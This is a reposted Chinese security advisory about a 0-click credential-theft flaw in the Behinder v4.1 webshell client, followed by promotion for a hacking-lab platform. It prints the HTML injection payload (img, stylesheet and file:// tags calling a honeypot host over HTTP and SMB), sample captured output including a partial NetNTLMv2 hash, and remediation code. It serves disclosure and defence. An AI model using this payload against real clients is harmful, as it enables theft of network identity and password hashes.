---
title: 冰蝎 v4.1被爆，被恶意服务端利用实现 0-click 凭据窃取
url: https://mp.weixin.qq.com/s/bpmNr2P9kjDxBFW_bi9b0g
source: Doonsec's feed
date: 2026-05-03
fetch_date: 2026-05-04T05:29:22.302812
---

# 冰蝎 v4.1被爆，被恶意服务端利用实现 0-click 凭据窃取

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icCLY10D8tvKTTibkOMPdIMia9DvfrDvqpra6yvhtbS3boNfDKy92lWEDZGHCialEfiauGChTzjg7Fmr5rArzlvNrd7MztpBIf9yFGfLgb7vylsc/0?wx_fmt=jpeg)

# 冰蝎 v4.1被爆，被恶意服务端利用实现 0-click 凭据窃取

小叶Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于好靶场
，作者Elon

![](http://wx.qlogo.cn/mmhead/XYrRG5UShDc8MiasaqKIRuv8ygOQeco20z91bZzqSptr4yT8nEmmLBzdFCY6BRHg3fKmcfiafia6cg/0)

**好靶场**
.

学安全要练习，练习就选好靶场。我们立志于为所有的网络安全同伴制作出好的靶场，让所有初学者都可以用最低的成本入门网络安全。

> 💡 好靶场
>
> 团队宗旨：我们立志于为所有的网络安全同伴制作出好的靶场，让所有初学者都可以用最低的成本入门网络安全。所以我们团队名称就叫“好靶场”。

---

我们承诺每天至少更新1-2个新靶场，目前靶场800+；好靶场追求的是稳定日常更新而不仅仅是数量。好靶场使用教程：[【好靶场】用户使用指南](https://mp.weixin.qq.com/s?__biz=Mzg4MDg5NzAxMQ==&mid=2247486175&idx=1&sn=d4fd496c04eff81802f2c1be30f77b78&scene=21#wechat_redirect)

---

## 1. 好靶场介绍

**官网链接http://www.loveli.com.cn/**

> 零基础入门不迷茫！ 专属网络安全从零到一体系化训练——配套完整靶场+精选学习资料，帮你快速搭建网安知识框架，迈出入门关键一步！ 全场景实战全覆盖！ 聚焦Web渗透工程师核心能力，深度拆解TOP10逻辑漏洞，精通PHP代码审计、Java代码审计等核心技能，从基础原理到实战攻防，覆盖行业高频应用场景！ 真实漏洞场景沉浸式体验！src训练专题重磅上线——1:1还原真实漏洞报告，让你亲身感受实战挖洞流程，积累符合企业需求的实战经验！

🚀哈喽～各位亲爱的宝子们，五一假期第三天好呀👋！✨！没错，好靶场节假日也是正常更新内容！今天给大家带来的是BasicInfo WebView 未过滤服务端 HTML 导致外部资源加载，可被恶意服务端利用实现 0-click 凭据窃取 ，接下来，就跟着我一起去看看是怎么回事，详细内容就在下方👇，快来一起学习一下～

## 2. 漏洞详情

### 漏洞概述

BasicInfo 页面 WebView 未对服务端返回的 HTML 内容做安全过滤，存在外部资源任意加载风险，恶意服务端可构造恶意 HTML 利用该漏洞实现零点击（0-click）用户凭据窃取。 在冰蝎 v4.1 中发现一个安全问题：客户端连接 WebShell 后，服务端返回的 basicInfo 字段（HTML 格式）被直接传入 JavaFX WebView.loadContent() 渲染，未经任何内容过滤或标签白名单限制。虽然代码中调用了 setJavaScriptEnabled(false) 禁用 JavaScript，但 WebView 的 HTML/CSS 解析器仍会自动加载 HTML 中引用的外部资源（图片、样式表、iframe 等）。恶意 WebShell 服务端（蜜罐）可利用此行为，在操作者连接的瞬间触发出站 HTTP 和 SMB 连接，捕获操作者的真实 IP、Windows 用户名、主机名、域名以及可离线破解的 NetNTLMv2 密码哈希，整个过程无需额外用户交互（0-click）。

### 影响版本

冰蝎 v4.1（其他版本未逐一验证，但只要 MainWindowController 中存在 WebView.loadContent(basicInfoStr) 且未过滤 HTML 标签即受影响）

### 漏洞复现

1. 环境准备

准备一个 Python 蜜罐脚本，模拟 WebShell 服务端的冰蝎协议（AES/ECB + Base64 + JSON），在 BasicInfo 响应的 basicInfo 字段中注入包含外部资源引用的 HTML：

```
<img src="http://蜜罐IP:9090/beacon.png" width="1" height="1">
<link rel="stylesheet" href="http://蜜罐IP:9090/style.css">
<img src="file://蜜罐IP/share/logo.png" width="1" height="1">
```

蜜罐同时在对应端口启动 HTTP 信标服务器和 SMB 捕获服务器（impacket）。

2. 连接与触发

使用冰蝎客户端连接蜜罐的 WebShell 地址 冰蝎自动发送 Echo 握手 → 蜜罐返回正确的 Echo 响应（偏移校准） 冰蝎发送 BasicInfo 请求 → 蜜罐返回投毒的 BasicInfo 响应 客户端 MainWindowController 解密响应后直接调用 webengine.loadContent(basicInfoStr) WebView 渲染恶意 HTML，自动加载外部资源： HTTP 请求发往蜜罐的信标服务器 → 捕获真实 IP、User-Agent、Accept-Language file://蜜罐IP/share/... 触发 SMB 连接 → Windows 自动发送 NTLM 认证 → 捕获 NetNTLMv2 哈希 全程 无任何弹窗、无需点击、无需额外操作 3. 实测结果

单次连接触发 12 个独立的出站 HTTP 请求（CSS、img、iframe、object、embed、prefetch、preload、meta-refresh），以及 SMB 连接。已成功捕获：

```
# HTTP Beacon
IP: 192.168.31.56
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/606.1 (KHTML, like Gecko) JavaFX/8.0 Safari/606.1
Language: zh-cn,en-us;q=0.8,en;q=0.7

# NetNTLMv2 Hash (hashcat -m 5600)
Administrator::PC-20241022AZEN:aaaaaaaaaaaaaaaa:f3bfabebe9ac...:<blob>
```

原因分析 setJavaScriptEnabled(false) 仅禁用了 JavaScript 执行引擎，但 JavaFX WebView（底层 WebKit 606.1）的 HTML 标签解析、CSS 解析和外部资源加载功能完全独立于 JS 引擎，仍然正常运行。服务端返回的 basicInfo HTML 在传入 loadContent() 之前没有任何过滤。

数据流：

```
服务端响应（AES加密）→ 客户端AES解密 → JSON解析 → Base64解码basicInfo字段 → loadContent(原始HTML) → WebKit解析HTML标签 → 自动加载//
```

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvLQjlfL2eDtdTic1Kt2wxnPOnHicsneGBeTacQpgq1ibQRJZZIRpW5DLlRzTl6oJibRAqSvYzxd8Tda6VPTgRruD1iaARR2ib6h00ickM/640?wx_fmt=png&from=appmsg)

建议修复方案

方案一：HTML 标签白名单过滤（最小改动）

在 loadContent() 之前对 basicInfoStr 进行标签白名单过滤，仅保留格式化标签，移除所有带外部引用属性的标签：

```
// 在 MainWindowController.java 第 192 行之前添加 String sanitized = basicInfoStr .replaceAll("<(?!br|/br|font|/font|b|/b|i|/i)[^>]>", "")  // 仅保留安全标签 .replaceAll("(?i)(src|href|data|background|style)\s=", ""); // 移除危险属性 webengine.loadContent(sanitized);
```

方案二：替换为纯文本渲染（推荐）

将 WebView 替换为 TextArea 或 Label，以纯文本方式展示服务端信息，从根本上消除 HTML 解析带来的攻击面：

```
// 替代方案：用 TextArea 代替 WebView
TextArea infoArea = new TextArea();
infoArea.setEditable(false);
infoArea.setText(basicInfoStr.replaceAll("<[^>]*>", ""));  // 去除所有 HTML 标签
```

方案三（深度加固）：阻止外部资源加载

如必须保留 WebView，通过自定义 WebEngine 配置阻止外部协议加载：

拦截 http://、https://、file://、ftp:// 等非 data: 协议的资源请求 或设置严格的 Content-Security-Policy：default-src 'none'; style-src 'unsafe-inline' 补充说明 本 issue 以负责任披露的原则提交，目的是帮助项目改进安全性 该问题为 0-click 漏洞，操作者连接 WebShell 的瞬间即触发，无需任何额外交互 攻击前提是恶意服务端知道冰蝎通信密码（对于蜜罐/反制场景，密码由蜜罐设定，天然已知） 已开发完整 PoC 蜜罐脚本（Python），如需进一步的技术细节或 PoC 代码，请联系我

### 截图内容

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvKoGISAPuibH0lt6TQ5I73fv3ObufOceIzBCXkl7pRJqXKRzFaCykSh9wgoglvfaC7pW7W6zTKcS9hrzsvc7pOE8ibn1xa1WB9GI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvLIy6zDn2S22rFP7onq7Oiat9UUE4n18RIxujL1bIHf4uh3zHhbj1p1KicVODBYv8fvIGOvhW6icAtWZl9ncjMEmAe8icgXqBiazEiao/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJB9ibQGlsMLerUZ5hj4Wo5BtsR1uC0HDgC2qBIsKHLw3PJmZCOr8MvicJCmBtzfR2libMUKYxBblpl7W1LBibmboGicN4XWs7SgQes/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJibC2QKkUWgmVThrUCvcZlohibkShuZcbohK5zKrJia9Eic34FOm7KbgC2kwn0Q522hBCPjenLO2wfoXWynh3lVicFVEZbwBsviahb8/640?wx_fmt=png&from=appmsg)

```
github地址https://github.com/rebeyond/Behinder/issues/313
```

## 3. 如何使用好靶场

### 首先关注“好靶场微信公众号”然后发送bug，可以点击链接直接登录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvJn80Sicpic7OmticxNKsrrgJFTNUhAftHBnCibiaicLFUCB8ehvyT0PrXEG4lDcsnvDLAqJSBQlHz0V4F8SIF5gpO9iaNiaH97PBFjQRw/640?wx_fmt=png&from=appmsg)

## 4. 福利

### 福利1： 找到个人中心，邀请码输入0482d6d28539424c，白嫖14天高级会员。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvLCicFgYymsZVpugibO1C8AVsib8XicsA53jA7a050c434b35AhxXQHcdCOzjtRl9N3GpUzIsFdNXY0rh56Mll8dmpKNJIib98uZvibQ/640?wx_fmt=png&from=appmsg)

### 福利2： 关注好靶场bilibili。拿着关注截图找到客服，领取5积分或者7天高级会员。

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvIicU6vDElyplQWIXkDdgNCmMkL9xCMOx9EsUKtNN4OhyBrAGbMo3QkpzFS5OP8ETAdLenHsJAjz3XCVrfnBSu186zyaqERbsLk/640?wx_fmt=png&from=appmsg)

## 5. 每日限免

每日限免 为了能让更多的宝子可以免费的开启会员靶场，我们会在工作日随机开放一些靶场的限免，还请加群关注。

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJguqkEichc2zwjCTwfQsl8FW56dZAlNmdDAbLVarx22icu0Y6sJibk94vBBoibkNU3htXEknvAVQQCObYtlB51hatQab1ibRp13a98/640?wx_fmt=png&from=appmsg)

我们会在微信群、QQ群每天更新限免靶场，以及免费学习资料；任选一个群添加即可，所有的通知都会到位在交流群通知，请添加好友，我将邀请你加入“好靶场内部交流群”

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvKvSCywPlC90S8mWg9fr8xxhWShHvJ3z1njibcmLCFHchA6Xl70fByLuek75ZgF8uUR5r8wqQJT730tcQvzD7ATHIdIibj1Yq3Io/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvL62Jib8LO4pnzu27PofUnice4tk9fv57UjsK6dySBood4KOYYIyqcyzG8xdksv5hWMltXV27rSiaQBoXbQd4scwms3D2oXp5PX3A/640?wx_fmt=png&from=appmsg)

## 6. 好靶场AI客服机器人

为方便学习还有提问，我们设计了好靶场Ai客服机器人，可以完成简单的客服能力，以及好靶场日常靶场提醒更新、根据你的询问推荐靶场

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJWgicVJZCqicFqHryHf2oekbyLAic3fkgiaibJeZF3sofXCBPJj1EokyFA6CWGqoah7K5wGP9fGgRbXrof4QwkGm8sFV8PLUZlBdicA/640?wx_fmt=png&from=appmsg)

### “噜噜大王”正式上线

大家点击左边的快捷工具，有一个AI助教功能，然后点开就可以和噜噜大王对话啦，由于是内测期间，仅限于年会员才可以进行使用。还需要进行微调，会随着大家的使用而进行优化；你可以尝试问一下关于打靶场的问题

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvK1RlBXJbdDIe8jYZUA7cMeNEt6GPYrvWNlscicVd9By96cN6ZDdFZUZiapQNV9Iaks47yKj1sTVlhUySHC5JjakQlic8IOxESrxo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvKyMSLW05iaib7FvHM5rialIZEVsKnH9WN4QqPR4eibiczqI4YicicIfUJ1owGmqyxib90KYpmgXskmuwiaLUusvnfOAcKHoPcP70jaLzCA/640?wx_fmt=png&from=appmsg)

## 🚀好靶场会员订阅

好靶场会员订阅 首先点击会员订阅 ，然后选择对应的套餐 ，选择对应的会员去支付 ，支付完成后即可会员到账

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvLicRSPx4NXENbaPVxeF2rLIuyHArtS8HOoIM8TfID3wFxo8icSQDQasMxnqU9QbjfXskbHibKgHbeVBw3nBZ21L65YekWYnt4xUA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJcatqLTdbqI1MI6wP5uKCiagTMKqQOvHlrRI5nIGzOg4nzIKIwfOBruOVe7cSNK7T29SwAyUY7f0tMTuqicl4aKUBAGJKPKa3A0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icCLY10D8tvJkQZQagkapGxPmA54TpyG9ic1NiaMQlhCdpKSVPMGuDZiaiaAZBHrD35MqBAb3DaOxiaDe4FZgUhFwOrDpUxrcKH6AzzS1KK3xnibVc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCLY10D8tvLqz0Ib7Km2ibLlJRMh5P4mxCyIticKBG...